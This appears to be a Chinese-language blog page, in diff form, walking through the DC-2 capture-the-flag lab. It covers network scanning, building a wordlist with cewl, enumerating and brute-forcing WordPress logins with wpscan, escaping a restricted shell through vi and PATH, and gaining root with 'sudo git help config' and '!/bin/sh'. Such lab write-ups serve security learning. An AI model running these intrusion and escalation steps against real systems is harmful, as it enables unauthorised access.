@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="老样子，先arpscan扫一下 1arp-scan -l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-2">
+<meta property="og:url" content="http://example.com/2023/07/14/DC-2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="老样子，先arpscan扫一下 1arp-scan -l">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dc2.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dc_21.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dc_3.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dc_22.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dc_23.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dc_24.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dc_25.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dc_26.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dc_27.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/dc_28.png">
+<meta property="article:published_time" content="2023-07-14T03:19:25.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:44:50.481Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/dc2.png">
+
+<link rel="canonical" href="http://example.com/2023/07/14/DC-2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DC-2 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/14/DC-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DC-2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-14 11:19:25" itemprop="dateCreated datePublished" datetime="2023-07-14T11:19:25+08:00">2023-07-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:44:50" itemprop="dateModified" datetime="2025-05-25T11:44:50+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>老样子，先arpscan扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p><img src="https://ilikeoyt.github.io/image/dc2.png" alt="img"></p>
+<p>继续扫端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 1-65535 192.168.112.132</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/dc_21.png" alt="img"></p>
+<p>发现有个<code>|_http-title: Did not follow redirect to http://dc-2/</code></p>
+<p>感觉像是DNS解析</p>
+<p>修改hosts</p>
+<p>成功访问，是一个WordPress页面，并且有个flag</p>
+<p><img src="https://ilikeoyt.github.io/image/dc_3.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure>
+
+<p>提示用cewl来获取密码，所有应该是爆破密码之类的，且提示自己的密码字典可能无效，且有时没法获得所有密码，提示用其他的身份去登录</p>
+<p><strong>cewl是通过爬行网站获取关键信息创建一个密码字典</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/index.php/flag -w dict.txt </span><br></pre></td></tr></table></figure>
+
+<p>-w选项是指定输出文件</p>
+<p>主题是wordpress，那就扫描一下用户吧，提示密码了，应该是让登录<br>使用wpscan工具：</p>
+<p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。<br>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的Wordpress站点暴力破解用户名密码。</p>
+<p>枚举一下用户,枚举出admin，jerry，tom</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/dc_22.png" alt="img"></p>
+<p>然后将三个用户名存入users.txt，然后用该文件与刚刚的密码字典进行爆破</p>
+<p><img src="https://ilikeoyt.github.io/image/dc_23.png" alt="img"></p>
+<p>爆出来两个密码，没有admin的，尝试登录（WordPress的默认登录界面为wp-admin）</p>
+<p>成功登录</p>
+<p><img src="https://ilikeoyt.github.io/image/dc_24.png" alt="img"></p>
+<p>找到flag2</p>
+<p><img src="https://ilikeoyt.github.io/image/dc_25.png" alt="img"></p>
+<p>提示无法利用wordpress采取捷径，尝试令一种方法，之前nmap扫描出了7744端口，那么我们是不是可以尝试ssh登录<br>发现使用tom账号登录成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.112.132 -p 7744</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/dc_26.png" alt="img"></p>
+<p>查看文件（只有less ls scp vi能用）</p>
+<p><img src="https://ilikeoyt.github.io/image/dc_27.png" alt="img"></p>
+<p>提示要切换用户到jerry</p>
+<p>利用vi命令获取高权限shell，然后利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exprot -p //查看所有环境变量</span><br><span class="line">export PATH=&#x27;/bin&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>修改环境变量，而后使用su jerry切换用户</p>
+<p>再cat &#x2F;home&#x2F;jerry&#x2F;flag4.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>
+
+<p>提示git提权，输入<code>find / -perm -u=s -type f 2&gt;/dev/null</code>发现sudo是可以使用的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>获得root权限，<code>cat /root/final-flag.txt</code></p>
+<p><img src="https://ilikeoyt.github.io/image/dc_28.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/07/14/java-cc%E9%93%BE3/"> java_cc链3</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/07/19/java-cc%E9%93%BE4/">java_cc链4 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/13/java-cc%E9%93%BE1/" rel="prev" title="java_cc链1">
+      <i class="fa fa-chevron-left"></i> java_cc链1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/14/java-cc%E9%93%BE3/" rel="next" title="java_cc链3">
+      java_cc链3 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
